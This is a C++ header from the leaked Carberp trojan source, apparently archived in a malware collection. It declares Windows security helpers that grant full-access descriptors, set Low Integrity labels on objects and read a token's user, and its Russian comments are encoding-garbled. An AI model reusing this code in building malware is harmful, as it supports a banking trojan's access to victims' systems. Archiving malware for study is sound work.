/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ������ � ������������� ������������ Windows.
*/
#pragma once

namespace WinSecurity
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������� SECURITY_ATTRIBUTES � SECURITY_DESCRIPTOR � ������ ��������.

    OUT sa - ��������� SECURITY_ATTRIBUTES, ����� ���� NULL, ���� �������� �� �����.
    OUT sd - ��������� SECURITY_DESCRIPTOR.

    Return - � ������ ������: ����� ������ ������� ����� ���������� ����� LocalFree, ���  (void *)-1.
             � ������ ������: NULL.

    ����������: sa � sd ������� ����� �����.
  */
  void *_getFullAccessDescriptors(SECURITY_ATTRIBUTES *sa, SECURITY_DESCRIPTOR *sd);

  /*
    ��������� �� ������ ���� �� ������ ����� ��� Low Integrity ���������.

    IN name       - ��� �������.
    IN objectType - ��� ������� SE_OBJECT.
    IN inherit    - ������� ������������ �������� ��������.
    
    Return        - true - � ������ ������,
                    false - � ������ ������.
  */
  bool _setLowIntegrityLevelLabel(LPWSTR name, DWORD objectType, bool inherit);

  /*
    ��������� TOKEN_USER �� ������.

    IN token - �����, ����� ����� TOKEN_QUERY.

    Return   - NULL - � ������ ������,
               ����� ��������� � ������ ������, ���������� ���������� ����� Mem.
  */
  TOKEN_USER *_getUserByToken(HANDLE token);
};
